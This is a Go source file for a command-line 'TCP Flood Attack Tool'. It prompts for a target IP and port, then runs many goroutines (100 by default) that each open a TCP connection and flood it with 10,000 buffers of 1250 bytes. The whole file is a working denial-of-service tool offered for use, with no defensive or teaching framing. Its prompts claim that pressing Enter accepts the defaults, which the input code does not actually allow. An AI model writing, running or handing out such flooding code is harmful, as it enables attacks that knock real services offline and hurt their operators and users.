package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
)

const (
	defaultForce   = 1250
	defaultThreads = 100
)

type Brutalize struct {
	ip      string
	port    int
	force   int
	threads int
}

func NewBrutalize(ip string, port, force, threads int) *Brutalize {
	return &Brutalize{
		ip:      ip,
		port:    port,
		force:   force,
		threads: threads,
	}
}

const maxPacketsPerThread = 10000 // Change this to your desired maximum

func (b *Brutalize) flood() {
	var wg sync.WaitGroup
	for i := 0; i < b.threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			b.send()
		}()
	}
	wg.Wait()
}

func (b *Brutalize) send() {
	targetAddr, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", b.ip, b.port))
	if err != nil {
		fmt.Println("Error resolving target address:", err)
		return
	}

	conn, err := net.DialTCP("tcp", nil, targetAddr)
	if err != nil {
		fmt.Println("Error opening connection:", err)
		return
	}
	defer conn.Close()

	data := make([]byte, b.force)
	for packetCount := 0; packetCount < maxPacketsPerThread; packetCount++ {
		_, err := conn.Write(data)
		if err != nil {
			fmt.Println("Error sending data:", err)
			return
		}
	}
}

func main() {
	fmt.Println("TCP Flood Attack Tool")

	ip := getInput("Enter the target IP -> ")
	port := getInput("Enter the target port -> ")

	portInt, err := strconv.Atoi(port)
	if err != nil {
		fmt.Println("Invalid port:", err)
		return
	}

	force := getInput("Bytes per packet [press enter for 1250] -> ")
	forceInt := defaultForce
	if force != "" {
		forceInt, err = strconv.Atoi(force)
		if err != nil {
			fmt.Println("Invalid force value:", err)
			return
		}
	}

	threads := getInput("Threads [press enter for 100] -> ")
	threadsInt := defaultThreads
	if threads != "" {
		threadsInt, err = strconv.Atoi(threads)
		if err != nil {
			fmt.Println("Invalid threads value:", err)
			return
		}
	}

	brutalize := NewBrutalize(ip, portInt, forceInt, threadsInt)
	brutalize.flood()

	fmt.Println("Press Enter to stop the attack.")
	fmt.Scanln()
}

func getInput(prompt string) string {
	var input string
	fmt.Print(prompt)
	_, err := fmt.Scan(&input)
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error:", err)
		os.Exit(1)
	}
	return input
}